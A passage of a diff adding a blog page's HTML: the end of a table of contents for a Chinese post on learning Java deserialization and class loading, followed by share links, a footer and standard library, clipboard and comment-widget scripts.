class="toc-text">Java 静态代理 例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">Java 动态代理 例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">动态代理在反序列化漏洞中的运用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">Java 类加载机制和对象创建过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.1.</span> <span class="toc-text">类加载机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD-file-http-jar"><span class="toc-number">3.3.2.</span> <span class="toc-text">URLClassLoader实现任意类加载 file&#x2F;http&#x2F;jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader-defineClass%E5%AE%9E%E7%8E%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB-%EF%BC%88%E4%B8%8D%E9%9C%80%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">3.3.3.</span> <span class="toc-text">ClassLoader.defineClass实现字节码加载任意类 （不需出网）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-defineClass%E5%AE%9E%E7%8E%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB-%EF%BC%88%E4%B8%8D%E9%9C%80%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">3.3.4.</span> <span class="toc-text">Unsafe.defineClass实现字节码加载任意类 （不需出网）</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=Java反序列化学习（1）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java反序列化学习（1）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化学习（1）&body=Check out this article: http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=Java反序列化学习（1）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=Java反序列化学习（1）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2025
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
